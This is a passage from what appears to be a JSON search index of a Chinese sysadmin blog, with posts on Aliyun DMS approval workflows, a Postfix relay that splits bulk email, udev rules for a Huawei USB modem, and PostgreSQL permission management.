src=\"/posts/20240305-aliyun_dms/image-20240305165325268.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以看到已经有2个实例用上了，然后到右边，点击编辑：\u003c/p\u003e\n\u003cp\u003e最主要的就是SQL变更，数据变更默认审批模板的设置，我们改成我们自己的审批流即可\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305165536661\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305165536661.png\"\u003e\u003c/p\u003e\n\u003cp\u003e其他的选项都可以按需进行修改。\u003c/p\u003e\n\u003ch4 id=\"五设置用户权限\"\u003e五、设置用户权限\u003c/h4\u003e\n\u003cp\u003e如上审批流就完成了，我们要登录具体的实例列表，再更多里设置权限\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305170005552\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305170005552.png\"\u003e\u003c/p\u003e\n\u003cp\u003e注意上面是设置的实例级别的权限。\u003c/p\u003e\n\u003cp\u003e如果要设置更细级别的库、表、行权限，需要点击数据库列表\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305170156449\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305170156449.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在这里面的表详情的右边更多，可以控制库、表、行的权限\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240305170334390\" loading=\"lazy\" src=\"/posts/20240305-aliyun_dms/image-20240305170334390.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这样就可以弄完整个流程了。\u003c/p\u003e","title":"阿里云DMS管理数据库变更审批流"},{"content":"这个问题十分的讨厌啊，Bi大数据部会群发报表邮件，但是如果有某位员工离职了，邮件地址被清理掉不存在了，那么群发邮件的时候会导致群发失败。\n网上搜索了一圈，阿里有篇文章是同样问题：\nhttps://blog.csdn.net/javaee_sunny/article/details/114836546\n解决方法是修改发送程序，剔除掉失效的邮件地址再发。\n这个方法在我们这里是行不通的，因为发送程序没人维护了，无法修改。\n那就只能曲线救国了：建立一个转发服务器，把群发邮件变成一封一份单独发，那么偶尔一份失败就失败了，不会导致整个群发的失败。\n搭建一个Postfix relay转发服务器：\nvi /etc/postfix/main.cf relayhost = [smtp.qiye.aliyun.com]:587 smtp_sasl_auth_enable = yes smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd smtp_sasl_security_options = noanonymous smtp_use_tls = yes smtp_tls_CAfile = /etc/pki/tls/certs/ca-bundle.crt smtp_sender_dependent_authentication = yes smtp_destination_recipient_limit = 1 message_size_limit=102400000 解释：转发到阿里邮件服务器的标准配置，网络上已经有很多教程了。然后关键就一条smtp_destination_recipient_limit = 1,这个就会把群发的邮件拆成单独的一封一封发送，发不出去的会回到queue尝试不断发送，最后失败drop掉。\n另外postfix缺省发送邮件的大小是10M，阿里邮局缺省是50M，我们需要修改一下，message_size_limit=102400000改成100M的限制。\n最后生成一下邮件用户的hash库：\nvi /etc/postfix/sasl_passwd [smtp.qiye.aliyun.com]:587 report@ddky.com:xxxxxxxx postmap /etc/postfix/sasl_passwd 那么发邮件的时候指定这台服务器，用户名是 report@ddky.com , 密码是xxxxxxxx就可以了\n补充，需要安装缺少的库，否则登录阿里邮局过不去，还需要打开服务器的允许网段列表，mynetwork\nyum install -y cyrus-sasl-plain ","permalink":"https://rendoumi.com/posts/20240304-posfix_relay/","summary":"\u003cp\u003e这个问题十分的讨厌啊，Bi大数据部会群发报表邮件，但是如果有某位员工离职了，邮件地址被清理掉不存在了，那么群发邮件的时候会导致群发失败。\u003c/p\u003e\n\u003cp\u003e网上搜索了一圈，阿里有篇文章是同样问题：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://blog.csdn.net/javaee_sunny/article/details/114836546\"\u003ehttps://blog.csdn.net/javaee_sunny/article/details/114836546\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e解决方法是修改发送程序，剔除掉失效的邮件地址再发。\u003c/p\u003e\n\u003cp\u003e这个方法在我们这里是行不通的，因为发送程序没人维护了，无法修改。\u003c/p\u003e\n\u003cp\u003e那就只能曲线救国了：建立一个转发服务器，把群发邮件变成一封一份单独发，那么偶尔一份失败就失败了，不会导致整个群发的失败。\u003c/p\u003e\n\u003cp\u003e搭建一个Postfix relay转发服务器：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/postfix/main.cf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003erelayhost\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003esmtp.qiye.aliyun.com\u003cspan class=\"o\"\u003e]\u003c/span\u003e:587\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esmtp_sasl_auth_enable\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e yes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esmtp_sasl_password_maps\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e hash:/etc/postfix/sasl_passwd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esmtp_sasl_security_options\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e noanonymous\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esmtp_use_tls\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e yes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esmtp_tls_CAfile\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e /etc/pki/tls/certs/ca-bundle.crt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esmtp_sender_dependent_authentication\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e yes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003esmtp_destination_recipient_limit\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emessage_size_limit\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e102400000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e解释：转发到阿里邮件服务器的标准配置，网络上已经有很多教程了。然后关键就一条\u003ccode\u003esmtp_destination_recipient_limit = 1\u003c/code\u003e,这个就会把群发的邮件拆成单独的一封一封发送，发不出去的会回到queue尝试不断发送，最后失败drop掉。\u003c/p\u003e\n\u003cp\u003e另外postfix缺省发送邮件的大小是10M，阿里邮局缺省是50M，我们需要修改一下，\u003ccode\u003emessage_size_limit=102400000\u003c/code\u003e改成100M的限制。\u003c/p\u003e\n\u003cp\u003e最后生成一下邮件用户的hash库：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/postfix/sasl_passwd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003esmtp.qiye.aliyun.com\u003cspan class=\"o\"\u003e]\u003c/span\u003e:587  report@ddky.com:xxxxxxxx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epostmap /etc/postfix/sasl_passwd\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e那么发邮件的时候指定这台服务器，用户名是 \u003ca href=\"mailto:report@ddky.com\"\u003ereport@ddky.com\u003c/a\u003e , 密码是xxxxxxxx就可以了\u003c/p\u003e\n\u003cp\u003e补充，需要安装缺少的库，否则登录阿里邮局过不去，还需要打开服务器的允许网段列表，mynetwork\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y cyrus-sasl-plain\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"邮箱地址无效导致群发邮件失败"},{"content":"这不是要出国就提前搭建了一个voip的电话系统么，结果在使用的过程中，华为的猫棒居然出现地址来回跳动的问题。\n正常情况下，lsusb的结果\nlsusb Bus 001 Device 017: ID 12d1:1436 Huawei Technologies Co., Ltd. Broadband stick 过一阵子，或者持续几天后，地址就变了\nlsusb Bus 001 Device 017: ID 12d1:1446 Huawei Technologies Co., Ltd. HSPA modem 看上面，vender id从1436变成了1446，名字也从stick变成了modem\n由于这个usb设备是直通到kvm的freepbx虚机里面去的，这直接导致voip系统不能用了，可恶啊。\n必须把它给固定下来，首先先从1446变回1436\nyum -y install epel-release yum -y install use_modeswitch usb_modeswitch -v 12d1 -p 1446 -c \u0026#34;/usr/share/usb_modeswitch/12d1:1446\u0026#34; 变回来了不成，还得把它彻底固定下来\nvi /lib/udev/rules.d/40-usb_modeswitch.rules #装了usb_modeswitch后居然已经自带了 # Generic entry for most Huawei devices, excluding Android phones ATTRS{idVendor}==\u0026#34;12d1\u0026#34;, ATTRS{manufacturer}!=\u0026#34;Android\u0026#34;, ATTR{bInterfaceNumber}==\u0026#34;00\u0026#34;, ATTR{bInterfaceClass}==\u0026#34;08\u0026#34;, RUN+=\u0026#34;usb_modeswitch \u0026#39;%b/%k\u0026#39;\u0026#34; shit，不管它，再次强行固定\nvi /lib/udev/rules.d/40-usb_modeswitch.rules、 # Huawei, newer modems ATTR{idVendor}==\u0026#34;12d1\u0026#34;, ATTR{idProduct}==\u0026#34;1446\u0026#34;, RUN+=\u0026#34;usb_modeswitch \u0026#39;%b/%k\u0026#39;\u0026#34; 这样就搞定了，得亏提前发现了这问题，否则跑到国外再发现，就晚了！\n","permalink":"https://rendoumi.com/posts/20240216-lsusb_huawei/","summary":"\u003cp\u003e这不是要出国就提前搭建了一个voip的电话系统么，结果在使用的过程中，华为的猫棒居然出现地址来回跳动的问题。\u003c/p\u003e\n\u003cp\u003e正常情况下，lsusb的结果\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elsusb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e001\u003c/span\u003e Device 017: ID 12d1:1436 Huawei Technologies Co., Ltd. Broadband stick\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e过一阵子，或者持续几天后，地址就变了\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elsusb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBus \u003cspan class=\"m\"\u003e001\u003c/span\u003e Device 017: ID 12d1:1446 Huawei Technologies Co., Ltd. HSPA modem\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e看上面，vender id从1436变成了1446，名字也从stick变成了modem\u003c/p\u003e\n\u003cp\u003e由于这个usb设备是直通到kvm的freepbx虚机里面去的，这直接导致voip系统不能用了，可恶啊。\u003c/p\u003e\n\u003cp\u003e必须把它给固定下来，首先先从1446变回1436\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install epel-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install use_modeswitch\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eusb_modeswitch -v 12d1 -p \u003cspan class=\"m\"\u003e1446\u003c/span\u003e -c \u003cspan class=\"s2\"\u003e\u0026#34;/usr/share/usb_modeswitch/12d1:1446\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e变回来了不成，还得把它彻底固定下来\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /lib/udev/rules.d/40-usb_modeswitch.rules\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#装了usb_modeswitch后居然已经自带了\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Generic entry for most Huawei devices, excluding Android phones\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eATTRS\u003cspan class=\"o\"\u003e{\u003c/span\u003eidVendor\u003cspan class=\"o\"\u003e}==\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;12d1\u0026#34;\u003c/span\u003e, ATTRS\u003cspan class=\"o\"\u003e{\u003c/span\u003emanufacturer\u003cspan class=\"o\"\u003e}\u003c/span\u003e!\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Android\u0026#34;\u003c/span\u003e, ATTR\u003cspan class=\"o\"\u003e{\u003c/span\u003ebInterfaceNumber\u003cspan class=\"o\"\u003e}==\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;00\u0026#34;\u003c/span\u003e, ATTR\u003cspan class=\"o\"\u003e{\u003c/span\u003ebInterfaceClass\u003cspan class=\"o\"\u003e}==\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;08\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003eRUN\u003c/span\u003e\u003cspan class=\"o\"\u003e+=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;usb_modeswitch \u0026#39;%b/%k\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eshit，不管它，再次强行固定\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /lib/udev/rules.d/40-usb_modeswitch.rules、\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Huawei, newer modems\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eATTR\u003cspan class=\"o\"\u003e{\u003c/span\u003eidVendor\u003cspan class=\"o\"\u003e}==\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;12d1\u0026#34;\u003c/span\u003e, ATTR\u003cspan class=\"o\"\u003e{\u003c/span\u003eidProduct\u003cspan class=\"o\"\u003e}==\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;1446\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003eRUN\u003c/span\u003e\u003cspan class=\"o\"\u003e+=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;usb_modeswitch \u0026#39;%b/%k\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这样就搞定了，得亏提前发现了这问题，否则跑到国外再发现，就晚了！\u003c/p\u003e","title":"voip的lsusb检测华为猫棒usb地址来回跳动"},{"content":"公司选用了阿里云的PolarDB做数据库，这个东西其实就是Postgres增加了外挂，可以支持Oracle语法。\n没办法，得仔细研究一下Postgres的用户管理了。\nPostgreSQL权限架构是宝塔形结构\n最上层是实例\n实例中允许创建多个数据库\n每个数据库中可以创建多个schema，\n每个schema下面可以创建多个对象。\n对象包括表、物化视图、操作符、索引、视图、序列、函数、… 等等。\n上面schema中有个奇怪的东西，public，注意：是小写。\n先总结：PUBLIC是缺省的权限，代表所有人的意思（是个角色）。\n默认情况下，在创建数据库之后，允许PUBLIC角色(大写)连接，即允许任何人连接。\n默认情况下，数据库在创建后，不允许除了超级用户和owner所有者之外的任何人在数据库中创建schema。\n默认情况下，在创建数据库之后，会自动创建名为 public 的schema，这个schema的all权限已经赋予给PUBLIC角色（注意是大写），即允许任何人在里面创建对象。\nschema级别的权限，包括允许查看schema中的对象(USAGE)，以及允许在schema中创建对象(CREATE)。\n默认情况下新建的schema的权限不会赋予给PUBLIC角色，因此除了超级用户和owner，任何人都没有权限查看schema中的对象或者在schema中新建对象。\n举例来说，建了个库，又建了用户，没给这个用户赋予任何权限。缺省他就从PUBLIC角色继承了对库里的schema.pulic权限，可以连接到这个schema.pulic，并且在这里建临时表、建表、view等等对象，但是没办法建立其它schema。\nPostgreSQL的模式（SCHEMA）可以看作是一个表的集合。\n一个模式可以包含视图、索引、数据类型、函数和操作符等。\n再来说角色：\n在数据库中所有的权限都和角色挂钩。\n角色和用户的唯一区别在于，角色是nologin的，而用户允许login，仅此而已。\n而\u0026quot;PUBLIC\u0026quot;是一个特殊的角色，代表着所有人。\n那又有一个问题：\n每个PostgreSQL对象都有一个名为“所有者”的特殊角色。只有所有者才能执行某些操作，如 ALTER TABLE ，而你不能将这样的权限授予非所有者。\n那不可能只有一个人可以alter表结构吧，我们可以使用角色继承来解决此问题。创建 table_owner 角色并且 GRANT table_owner TO user1, user2 （user1和user2继承table_owner)，然后赋权 ALTER TABLE my_table OWNER TO table_owner 赋予table_owner所有者角色。现在表的所有者是 table_owner 了，但是因为 user1 和 user2 是该角色的成员，所以他们也具有继承权限来运行 ALTER TABLE了，如下图 。\n啰嗦了这么多，除了修改pg_hba.conf，赋权的命令就两条，grant和revoke，看下图：\n进入实战，首先从上到下都看一看，有什么库，有什么schema，有什么对象，有什么表，有什么索引，有什么角色：\n#推荐用psql来进行管理，有很多快捷键，navicat里面是没有的 #没有的话就装一个 yum install postgresql.x86_64 psql -h 10.8.2.61 -U admin #必用快捷键 #列出所有的库 \\l #列出所有的schema \\dn #看schema.public权限 \\dn+ public #列出所有的对象（table, view, sequences） \\d #列出所有的角色 \\du #列出所有表 \\dt #列出所有索引 \\di #同样的sql select * from pg_roles; #看看能登录的用户有哪些 select * from pg_user; 那自顶向下开始：\n#建立boms_admin角色：非超级用户+可以建立db+可以建立role+可以把权限继承给别人 create role boms_admin nosuperuser createdb createrole inherit; #建立用户，继承bomsuser的权限，可以登录，有密码 CREATE role bomsuser in role boms_admin login password ‘password’; #建立库，owner是boms_admin create database bomsdb owner boms_admin; #用新用户连接新的DB，当然也可以用超级用户连接，这两人都有权限 \\c bomsdb bomsuser; \\c bomsdb superuser; #先建立个schema，并且在schema里建个表 create schema zrr; create table zrr.test (x integer); insert into zrr.test values (1),(2),(3); select * from zrr.test; #召回PUBLIC可以在数据库级别中database test中连接、使用临时表的权限 revoke connect, temporary on database bomsdb from public; #召回PUBLIC可以在schema级别中可以USAGE使用和CREATE建立的权限，注意，你现在连接的是哪个库，召回的就是哪个库的public #这里连的是bomsdb库，召回的就是这个库里的schema.public REVOKE USAGE, CREATE ON SCHEMA public FROM public; #这样操作之后只有owner和superuser可以用这个database了 #我们必须显式赋权才可以连上并且建库了 #建个新用户 create user testuser login password ‘password\u0026#39;; #赋连接权限，赋予一个表的只读权限 grant connect on database bomsdb to testuser; grant usage on schema zrr to testuser; grant select on table zrr.test to testuser; #连接上去，测一下 \\c bomsdb testuser; select * from zrr.test; 两个脚本：\nA、看用户test1都有啥表权限\nSELECT grantee,table_schema,table_name, string_agg( privilege_type,\u0026#39;, \u0026#39; ) as privilege_type FROM information_schema.role_table_grants where grantee=\u0026#39;test1\u0026#39; group by table_name,table_schema,grantee; B、看表xxx都是什么用户才有权限\nSELECT grantee,table_schema,table_name,string_agg( privilege_type,\u0026#39;, \u0026#39; ) as privilege_type FROM information_schema.role_table_grants WHERE table_name=\u0026#39;xxx\u0026#39; group by grantee,table_schema,table_name; 提示无权限的时候，可以用以下函数来检查\nselect has_database_privilege(user, database, privilege); select has_schema_privilege(user, schema, privilege); select has_table_privilege(user, table, privilege); 太费劲了，花了两天时间才算大概搞明白。\n再给个初始的直白解释脚本：\n概念神：\n一、权限管理在 PostgreSQL 中是递归和分层的，因此需要分别管理1、数据库、2、模式，3、以及模式中的具体对象（如表）。三种级别中的权限。 二、PostgreSQL 的权限模型是累加的。 #首先用admin登录 #建立一个库 CREATE DATABASE test; #这时候schema.public直接就被建立了，而且PUBLIC直接赋权了 #这时候去\\dn+ public \\dn+ public List of schemas Name | Owner | Access privileges | Description --------+---------+--------------------+------------------------ public | dbadmin | dbadmin=UC/dbadmin+| standard public schema | | =UC/dbadmin | #上面命令可以看到只有dbadmin是Owner，且权限是UC #但实际从PGadmin里面看，还有个PUBLIC UC（USAGE+CREATE)的权限，缺省就赋予了 #下面一句虽然召回了public对库的权限，但是，建库就缺省有的PUBLIC对schema的权限不会消失 #因为postgres的权限机制是累加机制 #因此，你撤销了数据库层面的权限，但没有触及 public schema 本身的权限。 REVOKE ALL ON DATABASE test FROM public; #建立角色组，并且可以连接到数据库，在库级别赋予所有权限 #依然只会叠加，不会影响到public schema的权限 CREATE ROLE test_project; GRANT CONNECT ON DATABASE test TO test_project; GRANT ALL PRIVILEGES ON DATABASE test TO test_project; #建立角色，把角色组的权限给角色，就搞定了 CREATE ROLE test LOGIN PASSWORD \u0026#39;lankutest\u0026#39;; GRANT test_project TO test; 补充：\nPUBLIC 和 public（未加引号）是等价的，在 PostgreSQL 上大小写不敏感。 \u0026quot;PUBLIC\u0026quot;（加双引号）会被看作是一个字符串，而非 PostgreSQL 预定义的 PUBLIC 角色。 PUBLIC 是 PostgreSQL 的特殊保留角色，代表所有用户，不能直接创建或管理，也不会出现在 pg_roles 中。 再补充一下，如果就是建一个用户，然后对一个库有权限，简单了\n# 生成密码 tr -cd \u0026#39;[:alnum:]\u0026#39; \u0026lt; /dev/urandom | fold -w \u0026#34;21\u0026#34; | head -n 1 # 建用户和库 CREATE USER \u0026#34;work-booking\u0026#34; WITH PASSWORD \u0026#39;xxxxxxxx\u0026#39;; CREATE DATABASE \u0026#34;work-booking\u0026#34; OWNER \u0026#34;work-booking\u0026#34;; ","permalink":"https://rendoumi.com/posts/20240205-postgres_user_manager/","summary":"\u003cp\u003e公司选用了阿里云的PolarDB做数据库，这个东西其实就是Postgres增加了外挂，可以支持Oracle语法。\u003c/p\u003e\n\u003cp\u003e没办法，得仔细研究一下Postgres的用户管理了。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ePostgreSQL权限架构是宝塔形结构\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e最上层是实例\u003c/p\u003e\n\u003cp\u003e实例中允许创建多个数据库\u003c/p\u003e\n\u003cp\u003e每个数据库中可以创建多个schema，\u003c/p\u003e\n\u003cp\u003e每个schema下面可以创建多个对象。\u003c/p\u003e\n\u003cp\u003e对象包括表、物化视图、操作符、索引、视图、序列、函数、… 等等。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240205103517867\" loading=\"lazy\" src=\"/posts/20240205-postgres_user_manager/image-20240205103517867.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上面schema中有个奇怪的东西，public，注意：是小写。\u003c/p\u003e\n\u003cp\u003e先总结：PUBLIC是缺省的权限，代表所有人的意思（是个角色）。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e默认情况下，在创建数据库之后，允许PUBLIC角色(大写)连接，即允许任何人连接。\u003c/p\u003e\n\u003cp\u003e默认情况下，数据库在创建后，不允许除了超级用户和owner所有者之外的任何人在数据库中创建schema。\u003c/p\u003e\n\u003cp\u003e默认情况下，在创建数据库之后，会自动创建名为 public 的schema，这个schema的all权限已经赋予给PUBLIC角色（注意是大写），即允许任何人在里面创建对象。\u003c/p\u003e\n\u003cp\u003eschema级别的权限，包括允许查看schema中的对象(USAGE)，以及允许在schema中创建对象(CREATE)。\u003c/p\u003e\n\u003cp\u003e默认情况下新建的schema的权限不会赋予给PUBLIC角色，因此除了超级用户和owner，任何人都没有权限查看schema中的对象或者在schema中新建对象。\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e举例来说，建了个库，又建了用户，没给这个用户赋予任何权限。缺省他就从PUBLIC角色继承了对库里的schema.pulic权限，可以连接到这个schema.pulic，并且在这里建临时表、建表、view等等对象，但是没办法建立其它schema。\u003c/p\u003e\n\u003cp\u003ePostgreSQL的模式（SCHEMA）可以看作是一个表的集合。\u003c/p\u003e\n\u003cp\u003e一个模式可以包含视图、索引、数据类型、函数和操作符等。\u003c/p\u003e\n\u003cp\u003e再来说角色：\u003c/p\u003e\n\u003cp\u003e在数据库中所有的权限都和角色挂钩。\u003c/p\u003e\n\u003cp\u003e角色和用户的唯一区别在于，角色是\u003ccode\u003enologin\u003c/code\u003e的，而用户允许\u003ccode\u003elogin\u003c/code\u003e，仅此而已。\u003c/p\u003e\n\u003cp\u003e而\u0026quot;PUBLIC\u0026quot;是一个特殊的角色，代表着所有人。\u003c/p\u003e\n\u003cp\u003e那又有一个问题：\u003c/p\u003e\n\u003cp\u003e每个\u003ccode\u003ePostgreSQL\u003c/code\u003e对象都有一个名为“所有者”的特殊角色。只有所有者才能执行某些操作，如 \u003ccode\u003eALTER TABLE\u003c/code\u003e ，而你不能将这样的权限授予非所有者。\u003c/p\u003e\n\u003cp\u003e那不可能只有一个人可以alter表结构吧，我们可以使用角色继承来解决此问题。创建 \u003ccode\u003etable_owner\u003c/code\u003e 角色并且 \u003ccode\u003eGRANT table_owner TO user1, user2\u003c/code\u003e （user1和user2继承table_owner)，然后赋权 \u003ccode\u003eALTER TABLE my_table OWNER TO table_owner\u003c/code\u003e 赋予\u003ccode\u003etable_owner\u003c/code\u003e所有者角色。现在表的所有者是 \u003ccode\u003etable_owner\u003c/code\u003e 了，但是因为 \u003ccode\u003euser1\u003c/code\u003e 和 \u003ccode\u003euser2\u003c/code\u003e 是该角色的成员，所以他们也具有继承权限来运行 \u003ccode\u003eALTER TABLE\u003c/code\u003e了，如下图 。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240205113508881\" loading=\"lazy\" src=\"/posts/20240205-postgres_user_manager/image-20240205113508881.png\"\u003e\u003c/p\u003e\n\u003cp\u003e啰嗦了这么多，除了修改pg_hba.conf，赋权的命令就两条，\u003ccode\u003egrant\u003c/code\u003e和\u003ccode\u003erevoke\u003c/code\u003e，看下图：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240205103610366\" loading=\"lazy\" src=\"/posts/20240205-postgres_user_manager/image-20240205103610366.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进入实战，首先从上到下都看一看，有什么库，有什么schema，有什么对象，有什么表，有什么索引，有什么角色：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" 